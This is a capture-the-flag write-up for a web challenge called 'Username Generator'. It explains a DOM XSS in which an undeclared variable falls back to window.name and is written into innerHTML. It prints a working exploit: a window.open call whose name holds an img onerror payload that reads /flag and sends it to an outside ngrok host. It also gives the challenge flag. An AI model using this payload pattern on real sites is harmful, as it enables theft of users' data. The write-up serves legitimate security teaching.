<h1>Username Generator - Solution</h1>

<p><strong>Author</strong>: zeyu2001</p>

<p><strong>Category</strong>: Web</p>

<p>The vulnerability comes from the use of <code>name</code> below.</p>

<p>```javascript
const queryString = window.location.search;
const parameters = new URLSearchParams(queryString);
const usernameLength = parameters.get('length');</p>

<p>// Generate a random username and display it
if (usernameLength === null) {
    var name = "loading...";
    window.location.href = "/?length=10";
}
else if (usernameLength.length &gt; 0) {
    var name = generate(+usernameLength);
}
document.getElementById('generatedUsername').innerHTML = <code>Your generated username is: ${name}</code>;
```</p>

<p>The logic of this script is a bit suspicious. Consider the case where the <code>length</code> query parameter exists but is a string of length 0 - the <code>name</code> variable is never declared, yet it is used.</p>

<p>Since in HTML, the global scope is the window object (see <a href="https://www.w3schools.com/js/js_scope.asp">global scope</a>), <code>name</code> would then refer to <code>window.name</code>, which can be set when we open a new window programatically.</p>

<p>To solve this challenge, all we need to do is to ensure that the <code>name</code> variable is never redeclared, which happens when we use <code>?length=</code> as the query string so that <code>usernameLength === ''</code>. We can then control <code>window.name</code> when using <code>window.open()</code> on our exploit server, and cause an XSS due to the insecure usage of <code>innerHTML</code>.</p>

<p>```html</p>

<script>
    window.open(
        'http://app:80?length=', 
        '<img src=x onerror=\'fetch("/flag").then(response => response.text()).then(flag => { fetch("https://678e-115-66-128-224.ngrok.io?" + flag); });\'/>')
</script>

<p>```</p>

<p>Flag: <code>SEE{x55_15_my_m1ddl3_n4m3_00d21e74f830352781874d57dff7e384}</code></p>
